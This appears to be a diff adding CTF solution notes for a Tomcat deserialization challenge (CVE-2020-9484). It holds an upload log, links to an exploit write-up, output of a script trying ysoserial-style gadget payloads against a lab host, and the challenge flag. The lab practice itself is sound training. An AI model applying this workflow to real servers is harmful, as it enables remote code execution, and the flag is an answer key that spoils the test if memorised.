@@ -1,0 +1,43 @@
+/usr/local/uploads/test
+
+
+Uploading payload.bin
+
+[I]: Uploading File
+
+[I]: Filename: payload.bin
+
+[I]: Size: 1430 Bytes
+
+[I]: Content-Type: application/octet-stream
+
+[I]: File stored at /usr/local/uploads/payload.bin
+
+[I]: Detected content: Java serialization data, version 5
+
+[W]: Exactly this kind of things is threatening this cat
+
+
+
+https://www.redtimmy.com/apache-tomcat-rce-by-deserialization-cve-2020-9484-write-up-and-exploit/
+https://github.com/masahiro331/CVE-2020-9484
+
+➜  21 git:(main) ✗ ./uploader.py    
+Valid payload: payload_BeanShell1.session
+https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
+------------------------------------------------
+Valid payload: payload_C3P0.session
+https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
+------------------------------------------------
+Valid payload: payload_Clojure.session
+https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
+------------------------------------------------
+Valid payload: payload_CommonsBeanutils1.session
+https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
+------------------------------------------------
+Valid payload: payload_CommonsCollections1.session
+https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
+------------------------------------------------
+Valid payload: payload_CommonsCollections2.session
+https://c1084068-db92-46fc-b937-92858be641c9.idocker.vuln.land/cat/index.jsp
+HV20{!D3s3ri4liz4t10n_rulz!}
